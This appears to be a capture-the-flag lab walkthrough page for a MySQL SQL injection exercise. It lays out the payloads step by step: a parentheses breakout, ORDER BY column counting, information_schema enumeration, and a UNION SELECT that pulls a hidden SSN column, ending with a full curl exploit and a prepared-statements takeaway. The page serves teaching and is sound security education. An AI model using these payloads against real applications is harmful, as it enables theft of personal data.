<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the Employee ID field.
    You should see a MySQL syntax error, confirming the input is injected into the query.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br><br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near <strong>'executive''</strong> at line 1
    </div>
</div>

<p>
    The error leaks the query structure: we can see <code>''))</code> and
    <code>department != 'executive'</code>. This tells us the input is wrapped in
    <code>('...')</code> parentheses, and executive employees are filtered out.
</p>

<h4>Step 2: Break Out of the Parentheses</h4>
<p>
    The query structure is: <code>WHERE (id = ('$id')) AND department != 'executive'</code>.
    To break out, close the single quote AND both parentheses: <code>')) -- -</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Parentheses Breakout</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1')) -- -<br><br>
        <span class="prompt">Query: </span>SELECT name, department, salary FROM employees WHERE (id = ('1')) -- -')) AND department != 'executive'<br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> John Smith &bull; <strong>Department:</strong> engineering &bull; <strong>Salary:</strong> $85,000<br><br>
        <span class="prompt">Result: </span>No error -- breakout successful! The <code>-- -</code> comments out the rest.
    </div>
</div>

<h4>Step 3: Determine the Number of Columns</h4>
<p>
    Use <code>ORDER BY</code> to find the column count.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1')) ORDER BY 3 -- -&nbsp;&nbsp;&nbsp; &#10004; returns John Smith<br>
        <span class="prompt">Input: </span>1')) ORDER BY 4 -- -&nbsp;&nbsp;&nbsp; &#10008; <strong>Unknown column '4' in 'ORDER BY'</strong><br><br>
        <span class="prompt">Result: </span>The query returns <strong>3 columns</strong> (name, department, salary).
    </div>
</div>

<h4>Step 4: Discover Hidden Columns</h4>
<p>
    Enumerate columns in the <code>employees</code> table to find sensitive data.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Column Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>')) UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='employees' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> id &bull; <strong>Department:</strong> &bull; <strong>Salary:</strong> $0<br>
        <strong>Name:</strong> name &bull; <strong>Department:</strong> &bull; <strong>Salary:</strong> $0<br>
        <strong>Name:</strong> department &bull; <strong>Department:</strong> &bull; <strong>Salary:</strong> $0<br>
        <strong>Name:</strong> salary &bull; <strong>Department:</strong> &bull; <strong>Salary:</strong> $0<br>
        <strong>Name:</strong> <strong>ssn</strong> &bull; <strong>Department:</strong> &bull; <strong>Salary:</strong> $0<br><br>
        <span class="prompt">Result: </span>There's a hidden <code>ssn</code> column not shown in the normal display!
    </div>
</div>

<h4>Step 5: Extract the Executive SSN</h4>
<p>
    Now use <code>UNION SELECT</code> to query the <code>ssn</code> column
    for the executive employee. The <code>department != 'executive'</code>
    filter only applies to the first SELECT: your UNION bypasses it.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>')) UNION SELECT ssn, name, department FROM employees WHERE department='executive' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> FLAG{p4r3nth3s3s_br34k0ut} &bull; <strong>Department:</strong> Admin Root
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy <code>FLAG{p4r3nth3s3s_br34k0ut}</code> and paste it into the verification form.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab3" \<br> --data-urlencode "id=')) UNION SELECT ssn, name, department FROM employees WHERE department='executive' -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Wrapping input in parentheses does <strong>not</strong> prevent
    SQL injection. The attacker simply closes the parentheses along with the quote.
    Always use prepared statements regardless of how the query is structured.
    Notice we also discovered a hidden column (<code>ssn</code>) using
    <code>information_schema</code>: the app only showed 3 of the 5 columns.
</div>
